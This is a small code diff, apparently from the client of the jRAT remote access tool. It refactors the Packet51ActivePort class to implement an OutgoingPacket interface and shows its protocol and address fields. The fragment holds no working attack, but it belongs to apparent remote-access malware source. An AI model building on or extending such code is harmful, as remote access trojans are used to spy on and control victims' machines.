@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet51ActivePort extends AbstractOutgoingPacket {
+public class Packet51ActivePort implements OutgoingPacket {
 
 	private String protocol;
 	private String address;
